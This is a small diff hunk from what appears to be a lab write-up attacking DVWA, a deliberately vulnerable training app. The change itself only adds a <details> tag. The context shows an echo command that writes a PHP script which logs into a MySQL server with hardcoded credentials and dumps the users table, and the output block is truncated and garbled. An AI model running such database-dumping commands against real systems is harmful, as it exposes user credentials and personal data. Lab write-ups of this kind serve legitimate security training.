@@ -487,7 +487,7 @@ Connected successfully. The users table is the interesting one — let’s pull 
 echo '<?php $c = new mysqli("172.19.0.2", "dvwa", "p@ssw0rd", "dvwa"); $r = $c->query("SELECT * FROM users"); while ($row = $r->fetch_assoc()) { print_r($row); }' > /tmp/dump.php
 ```
 
-<summary>Click to view full output</summary>
+<details> <summary>Click to view full output</summary>
 
 ```
 <>fetch_assoc()) { print_r($row); }' > /tmp/dump.php
